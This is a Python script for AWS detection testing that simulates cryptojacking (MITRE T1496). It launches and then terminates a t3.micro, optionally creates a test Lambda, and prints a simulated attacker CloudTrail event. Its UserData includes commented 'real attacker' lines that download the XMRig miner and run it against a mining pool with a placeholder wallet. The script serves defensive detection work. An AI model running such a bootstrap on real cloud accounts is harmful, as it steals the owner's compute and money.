#!/usr/bin/env python3
"""
DISCLAIMER: This script is provided for authorized security testing and
educational purposes only. Use only in AWS accounts you own or have explicit
written permission to test. In execute mode, this script launches a real
EC2 instance (t3.micro only — NOT a GPU type) and schedules immediate
termination. Real AWS costs will be incurred. Unauthorized use is illegal.

CDET-011 — Unauthorized Compute Resource Launch Simulator
Tactic: Impact | T1496

Dry-run (default): Prints what instance types and counts would be launched,
and what the CloudTrail event would look like. No instances are created.

Execute mode (--execute): Launches a single t3.micro instance (safe, low cost)
and schedules immediate termination. Generates a RunInstances CloudTrail event
that should trigger CDET-011 if configured for GPU instance type monitoring.

NOTE: For GPU instance type detection testing without actual GPU costs, see
the --check-gpu-quota flag which calls DescribeInstanceTypes and triggers
similar reconnaissance CloudTrail events.

Usage:
    # Dry-run — show what would be launched
    python simulate.py

    # Check GPU instance availability and quotas (read-only)
    python simulate.py --check-gpu-quota

    # Execute — launch t3.micro and immediately terminate
    python simulate.py --execute

    # Execute with Lambda function creation
    python simulate.py --execute --include-lambda
"""

import argparse
import base64
import json
import logging
import sys
import time

import boto3
from botocore.exceptions import ClientError, NoCredentialsError

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)-8s %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("cdet011")

# GPU instance types that CDET-011 monitors for
GPU_INSTANCE_TYPES = [
    "p2.xlarge",
    "p2.8xlarge",
    "p2.16xlarge",
    "p3.2xlarge",
    "p3.8xlarge",
    "p3.16xlarge",
    "p4d.24xlarge",
    "g3.4xlarge",
    "g3.8xlarge",
    "g3.16xlarge",
    "g4dn.xlarge",
    "g4dn.2xlarge",
    "g4dn.4xlarge",
    "g4dn.8xlarge",
    "g4dn.12xlarge",
    "g4dn.16xlarge",
    "g5.xlarge",
    "g5.2xlarge",
    "g5.4xlarge",
    "g5.8xlarge",
    "g5.12xlarge",
    "g5.16xlarge",
    "g5.48xlarge",
]

# Safe test instance type (minimum cost, immediate termination)
SAFE_TEST_INSTANCE_TYPE = "t3.micro"

# Simulated attacker UserData (base64 encoded mining bootstrap - for realism)
SIMULATED_MINER_USERDATA = base64.b64encode(b"""#!/bin/bash
# SIMULATION ONLY - no actual mining occurs
# Mimics the structure of a real crypto miner bootstrap script
echo "$(date): CDET-011 simulation starting" >> /var/log/cdet011-sim.log
# Real attacker command would be:
# wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
# tar -xzf xmrig-*.tar.gz
# ./xmrig-6.21.0/xmrig -o pool.minexmr.com:4444 -u ATTACKER_WALLET -p x --background
echo "SIMULATION: This is a CDET-011 test instance. Will terminate shortly." >> /var/log/cdet011-sim.log
""").decode("utf-8")


def get_account_info(session: boto3.Session) -> tuple[str, str]:
    """Return (account_id, region)."""
    sts = session.client("sts")
    identity = sts.get_caller_identity()
    region = session.region_name or "us-east-1"
    return identity["Account"], region


def check_gpu_quota(session: boto3.Session) -> None:
    """
    Read-only check: enumerate GPU instance type availability and service quotas.
    This generates CloudTrail DescribeInstanceTypes events similar to attacker recon.
    """
    ec2 = session.client("ec2")
    log.info("Checking GPU instance type availability (read-only recon simulation)...")
    log.info("NOTE: This generates CloudTrail DescribeInstanceTypes events")

    try:
        resp = ec2.describe_instance_type_offerings(
            LocationType="availability-zone",
            Filters=[{"Name": "instance-type", "Values": ["p3.*", "g4dn.*", "g5.*"]}],
        )
        offerings = resp.get("InstanceTypeOfferings", [])
        available_types: dict[str, list[str]] = {}
        for offering in offerings:
            itype = offering["InstanceType"]
            az = offering["Location"]
            available_types.setdefault(itype, []).append(az)

        if available_types:
            print("\nGPU Instance Types Available in This Region:")
            for itype, azs in sorted(available_types.items()):
                print(f"  {itype:<20} AZs: {', '.join(azs)}")
        else:
            print("\nNo GPU instance types available in this region.")

    except ClientError as e:
        log.warning("Could not check GPU availability: %s", e.response["Error"]["Code"])

    # Also check service quotas for GPU instances
    try:
        sq = session.client("service-quotas")
        resp = sq.list_service_quotas(ServiceCode="ec2")
        gpu_quotas = [
            q for q in resp.get("Quotas", []) if any(gpu in q.get("QuotaName", "") for gpu in ["P ", "G ", "GPU"])
        ]
        if gpu_quotas:
            print("\nGPU-related Service Quotas:")
            for q in gpu_quotas[:10]:
                print(f"  {q['QuotaName']:<60} Limit: {q['Value']}")
    except ClientError:
        pass


def get_latest_amazon_linux_ami(ec2_client) -> str | None:
    """Find the latest Amazon Linux 2 AMI."""
    try:
        resp = ec2_client.describe_images(
            Owners=["amazon"],
            Filters=[
                {"Name": "name", "Values": ["amzn2-ami-hvm-*-x86_64-gp2"]},
                {"Name": "state", "Values": ["available"]},
            ],
        )
        images = sorted(resp["Images"], key=lambda x: x["CreationDate"], reverse=True)
        if images:
            ami_id = images[0]["ImageId"]
            log.info("Found AMI: %s (%s)", ami_id, images[0]["Name"])
            return ami_id
    except ClientError as e:
        log.warning("Could not describe images: %s", e.response["Error"]["Code"])
    return None


def get_default_subnet(ec2_client) -> str | None:
    """Find the default VPC's first available subnet."""
    try:
        vpcs = ec2_client.describe_vpcs(Filters=[{"Name": "isDefault", "Values": ["true"]}])
        if not vpcs["Vpcs"]:
            log.warning("No default VPC found")
            return None
        vpc_id = vpcs["Vpcs"][0]["VpcId"]

        subnets = ec2_client.describe_subnets(Filters=[{"Name": "vpc-id", "Values": [vpc_id]}])
        if subnets["Subnets"]:
            return subnets["Subnets"][0]["SubnetId"]
    except ClientError as e:
        log.warning("Could not find default subnet: %s", e.response["Error"]["Code"])
    return None


def dry_run_display(account_id: str, region: str) -> None:
    """Show what would be launched in execute mode."""
    print()
    print("=" * 60)
    print("CDET-011 DRY-RUN — Compute Resource Launch Preview")
    print("=" * 60)
    print()
    print("SIMULATED ATTACKER SCENARIO:")
    print("  What an attacker would launch:")
    print("  Instance type:  p3.16xlarge (8x NVIDIA V100 GPUs)")
    print("  Count:          10 instances")
    print("  Cost to victim: $24.48/hr × 10 = $244.80/hr ($5,875/day)")
    print("  UserData:       Mining bootstrap script (XMRig)")
    print()
    print("SAFE TEST SCENARIO (what --execute will actually launch):")
    print(f"  Instance type:  {SAFE_TEST_INSTANCE_TYPE} (no GPU — for safe testing)")
    print("  Count:          1 instance")
    print("  Cost:           ~$0.0104/hr (< $0.01 if terminated in < 1 minute)")
    print("  UserData:       Simulation script (no actual mining)")
    print("  Auto-terminate: Immediately after launch")
    print()
    print("CloudTrail event that WOULD be generated (attacker scenario):")
    simulated_event = {
        "eventName": "RunInstances",
        "eventSource": "ec2.amazonaws.com",
        "requestParameters": {
            "instanceType": "p3.16xlarge",
            "minCount": 10,
            "maxCount": 10,
            "imageId": "ami-example",
            "userData": "<base64-encoded-mining-script>",
        },
        "userIdentity": {
            "arn": f"arn:aws:iam::{account_id}:user/compromised-user",
            "accountId": account_id,
        },
        "awsRegion": region,
    }
    print(json.dumps(simulated_event, indent=2))
    print()
    print("GPU instance types monitored by CDET-011:")
    for itype in GPU_INSTANCE_TYPES:
        print(f"  - {itype}")
    print()
    print("[DRY-RUN] No instances launched. Add --execute to launch a safe t3.micro test instance.")


def launch_test_instance(session: boto3.Session, account_id: str) -> str | None:
    """Launch a single t3.micro and return instance ID."""
    ec2 = session.client("ec2")

    ami_id = get_latest_amazon_linux_ami(ec2)
    if not ami_id:
        log.error("Could not find a suitable AMI. Specify one manually.")
        return None

    subnet_id = get_default_subnet(ec2)
    if not subnet_id:
        log.error("Could not find a default subnet. Create one or specify manually.")
        return None

    log.info("Launching %s instance for CDET-011 testing...", SAFE_TEST_INSTANCE_TYPE)
    log.info("NOTE: This generates a real RunInstances CloudTrail event")

    try:
        resp = ec2.run_instances(
            ImageId=ami_id,
            InstanceType=SAFE_TEST_INSTANCE_TYPE,
            MinCount=1,
            MaxCount=1,
            SubnetId=subnet_id,
            UserData=SIMULATED_MINER_USERDATA,
            TagSpecifications=[
                {
                    "ResourceType": "instance",
                    "Tags": [
                        {"Key": "Purpose", "Value": "CDET-011-security-test"},
                        {"Key": "AutoTerminate", "Value": "true"},
                        {"Key": "Owner", "Value": "security-team"},
                    ],
                }
            ],
            # Instruct EC2 to not allow detailed monitoring (save cost)
            Monitoring={"Enabled": False},
        )

        instance_id = resp["Instances"][0]["InstanceId"]
        instance_type = resp["Instances"][0]["InstanceType"]
        log.info(
            "Instance launched: %s (type: %s) — CloudTrail RunInstances event generated",
            instance_id,
            instance_type,
        )
        return instance_id

    except ClientError as e:
        code = e.response["Error"]["Code"]
        log.error("RunInstances failed: %s — %s", code, e.response["Error"]["Message"])
        if code == "InsufficientInstanceCapacity":
            log.error("Try a different AZ or instance type")
        elif code == "InvalidParameterValue":
            log.error("Check AMI ID and instance type compatibility")
        return None


def terminate_instance(session: boto3.Session, instance_id: str) -> None:
    """Immediately terminate a test instance."""
    ec2 = session.client("ec2")
    log.info("Terminating test instance: %s", instance_id)
    try:
        ec2.terminate_instances(InstanceIds=[instance_id])
        log.info("Termination request sent for %s", instance_id)
        log.info("Waiting for instance to reach terminated state...")
        waiter = ec2.get_waiter("instance_terminated")
        waiter.wait(InstanceIds=[instance_id])
        log.info("Instance %s is now terminated", instance_id)
    except ClientError as e:
        log.error("Failed to terminate %s: %s", instance_id, e.response["Error"]["Code"])
        log.error(
            "MANUAL ACTION REQUIRED: Terminate %s manually in the AWS Console",
            instance_id,
        )


def create_test_lambda(session: boto3.Session, account_id: str, region: str) -> str | None:
    """Create a test Lambda function and return its ARN."""
    iam = session.client("iam")
    lam = session.client("lambda")

    role_name = "cdet011-test-lambda-role"

    # Create the execution role
    try:
        resp = iam.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(
                {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {"Service": "lambda.amazonaws.com"},
                            "Action": "sts:AssumeRole",
                        }
                    ],
                }
            ),
            Description="CDET-011 security test role",
            Tags=[{"Key": "Purpose", "Value": "CDET-011-security-test"}],
        )
        role_arn = resp["Role"]["Arn"]
        log.info("Created IAM role: %s", role_arn)
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
            log.info("Using existing role: %s", role_arn)
        else:
            log.error("Could not create IAM role: %s", e.response["Error"]["Code"])
            return None

    # Attach basic execution policy
    try:
        iam.attach_role_policy(
            RoleName=role_name,
            PolicyArn="arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole",
        )
    except ClientError:
        pass

    log.info("Waiting 10s for IAM role propagation...")
    time.sleep(10)

    # Create the function
    function_code = base64.b64decode(
        base64.b64encode(b"""
def handler(event, context):
    # CDET-011 simulation only -- no actual mining
    print("CDET-011: Simulated unauthorized Lambda function")
    return {"simulation": True, "cdet011": "test"}
""")
    )

    import io
    import zipfile

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        zf.writestr("index.py", function_code.decode())
    zip_bytes = buffer.getvalue()

    function_name = "cdet011-simulated-miner"
    try:
        resp = lam.create_function(
            FunctionName=function_name,
            Runtime="python3.12",
            Role=role_arn,
            Handler="index.handler",
            Code={"ZipFile": zip_bytes},
            Timeout=900,  # Maximum — attacker wants longest mining window
            MemorySize=3008,  # Maximum vCPU allocation
            Description="CDET-011 security test — simulated unauthorized function",
            Tags={"Purpose": "CDET-011-security-test"},
        )
        function_arn = resp["FunctionArn"]
        log.info(
            "Lambda function created: %s — CloudTrail CreateFunction event generated",
            function_arn,
        )
        return function_name
    except ClientError as e:
        code = e.response["Error"]["Code"]
        log.error("CreateFunction failed: %s", code)
        return None


def cleanup_lambda(session: boto3.Session, function_name: str) -> None:
    """Delete test Lambda function and role."""
    lam = session.client("lambda")
    iam = session.client("iam")
    role_name = "cdet011-test-lambda-role"

    try:
        lam.delete_function(FunctionName=function_name)
        log.info("Lambda function deleted: %s", function_name)
    except ClientError as e:
        log.warning("Could not delete Lambda: %s", e.response["Error"]["Code"])

    try:
        iam.detach_role_policy(
            RoleName=role_name,
            PolicyArn="arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole",
        )
        iam.delete_role(RoleName=role_name)
        log.info("IAM role deleted: %s", role_name)
    except ClientError as e:
        log.warning("Could not delete IAM role: %s", e.response["Error"]["Code"])


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CDET-011: Unauthorized Compute Resource Launch Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--check-gpu-quota",
        action="store_true",
        help="Read-only: check GPU instance availability and quotas. Generates recon CloudTrail events.",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Launch a t3.micro test instance (NOT a GPU type) and terminate it immediately.",
    )
    parser.add_argument(
        "--include-lambda",
        action="store_true",
        help="Also create and delete a test Lambda function (with --execute).",
    )
    parser.add_argument(
        "--profile",
        default=None,
        help="AWS profile name. Default: boto3 default chain.",
    )
    parser.add_argument(
        "--region",
        default="us-east-1",
        help="AWS region. Default: us-east-1",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("CDET-011 — Unauthorized Compute Resource Launch Simulator")
    print("Tactic: Impact | MITRE T1496")
    if args.execute:
        print("Mode: EXECUTE (will launch and immediately terminate t3.micro)")
    elif args.check_gpu_quota:
        print("Mode: GPU QUOTA CHECK (read-only)")
    else:
        print("Mode: DRY-RUN (no changes will be made)")
    print("=" * 60)

    try:
        session = boto3.Session(profile_name=args.profile, region_name=args.region)
    except Exception as e:
        log.error("Failed to create boto3 session: %s", e)
        sys.exit(1)

    try:
        account_id, region = get_account_info(session)
        log.info("Account: %s | Region: %s", account_id, region)
    except NoCredentialsError:
        log.error("No AWS credentials found. Run 'aws configure' first.")
        sys.exit(1)

    if args.check_gpu_quota:
        check_gpu_quota(session)
        return

    if args.execute:
        print()
        print("Launching t3.micro test instance (safe — NOT a GPU type).")
        print("A RunInstances CloudTrail event will be generated.")
        print("The instance will be terminated immediately after launch.")
        print()

        instance_id = launch_test_instance(session, account_id)

        if instance_id:
            log.info(
                "SUCCESS: RunInstances CloudTrail event generated for instance %s",
                instance_id,
            )
            log.info(
                "CDET-011 fires on GPU instance types. This test used %s. "
                "To test GPU detection, inject synthetic CloudTrail events or "
                "use --check-gpu-quota to generate recon events.",
                SAFE_TEST_INSTANCE_TYPE,
            )

            # Terminate immediately
            terminate_instance(session, instance_id)

        if args.include_lambda:
            print()
            log.info("Creating test Lambda function...")
            function_name = create_test_lambda(session, account_id, region)
            if function_name:
                time.sleep(5)  # Brief pause before cleanup
                cleanup_lambda(session, function_name)
    else:
        dry_run_display(account_id, region)


if __name__ == "__main__":
    main()
